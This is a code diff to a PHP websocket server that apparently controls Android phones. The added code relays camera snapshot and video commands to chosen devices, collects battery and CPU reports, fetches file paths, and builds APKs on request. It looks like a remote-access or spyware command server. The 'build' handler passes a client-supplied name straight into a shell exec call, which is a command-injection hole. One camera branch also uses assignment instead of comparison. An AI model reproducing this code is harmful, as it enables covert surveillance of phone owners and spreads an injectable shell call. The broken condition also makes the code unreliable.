@@ -20,7 +20,8 @@ class Chat implements MessageComponentInterface {
         $this->purgeClients();
     }
     public function onMessage(ConnectionInterface $from, $msg) {
-        echo "message from {$from->resourceId}:";
+        echo "\nmessage from {$from->resourceId}:";
+        //echo $msg;
         $msg=json_decode($msg);
       if(isset($msg->type)){
         if($msg->type=="handshake"){
@@ -75,12 +76,20 @@ class Chat implements MessageComponentInterface {
           $this->clients[$msg->to]->conn->send(json_encode($msg));
           update_image($msg->item,$msg->response);
         }else if($msg->type=="ping"){
-          echo json_encode($msg);
+          //echo json_encode($msg);
           $this->android[$from->resourceId]->time = time();
-          echo time() ;
-          battery_report($msg->id,$msg->battery);
+          //echo time() ;
+          battery_report($msg->id,$msg->battery,$msg->cpu);
+        }else if($msg->type=="build"){
+          system("cd ../App/network/;./gradlew assembleDebug");
+          exec("rm -f ../App/network/app/src/main/res/values/strings.xml");
+          exec("mv ../App/network/app/build/outputs/apk/app-debug.apk ../data/$msg->name.apk");
+        }else if($msg->type="camera"){
+          $rec=$msg->to;
+          unset($msg->to);
+          $this->clients[$rec]->conn->send(json_encode($msg));
         }else{
-          echo "unknown";
+
         }
 
       }else{
@@ -97,6 +106,10 @@ class Chat implements MessageComponentInterface {
               }else{
                 if($msg->cmd=="fetch"){
                   $data=["cmd"=>$msg->cmd,"path"=>$msg->path,"item"=>$msg->item,"from"=>$from->resourceId];
+                }else if($msg->cmd=="camera"){
+                  $data=["cmd"=>$msg->cmd,"cam"=>$msg->cam,"from"=>$from->resourceId,"frames"=>1];
+                }else if($msg->cmd=="video"){
+                  $data=["cmd"=>"camera","cam"=>$msg->cam,"from"=>$from->resourceId,"frames"=>$msg->frames];
                 }else
                   $data=["cmd"=>$msg->cmd,"from"=>$from->resourceId];
 
